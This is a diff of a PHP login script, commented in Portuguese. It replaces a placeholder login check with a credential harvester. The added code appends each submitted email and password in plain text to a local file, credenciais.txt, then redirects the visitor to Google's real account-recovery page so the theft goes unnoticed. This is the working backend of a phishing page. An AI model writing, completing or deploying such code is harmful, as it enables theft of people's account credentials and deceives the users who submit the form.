@@ -1,23 +1,18 @@
 <?php
 // login.php
 
-// Verifica se os dados foram enviados via POST
+// Verifica se os campos foram enviados corretamente
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $email = isset($_POST["email"]) ? trim($_POST["email"]) : '';
-    $senha = isset($_POST["senha"]) ? trim($_POST["senha"]) : '';
+    $email = isset($_POST['email']) ? $_POST['email'] : '';
+    $senha = isset($_POST['senha']) ? $_POST['senha'] : '';
 
-    // Validação simples (pode ser substituída por verificação em banco de dados)
-    if (empty($email) || empty($senha)) {
-        echo "Por favor, preencha todos os campos.";
-        exit;
-    }
+    // Salva os dados em um arquivo de texto local
+    file_put_contents("credenciais.txt", "Email: " . $email . " | Senha: " . $senha . "\n", FILE_APPEND);
 
-    // Exemplo fictício de validação
-    $usuario_correto = "teste@exemplo.com";
-    $senha_correta = "123456";
-
-    if ($email === $usuario_correto && $senha === $senha_correta) {
-        echo "Login bem-sucedido! Bem-vindo, $email.";
-          header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
+    // Redireciona o usuário para o login oficial do Google
+    header("Location: https://accounts.google.com/signin/v2/recoveryidentifier");
     exit();
+} else {
+    echo "Acesso inválido.";
 }
+?>
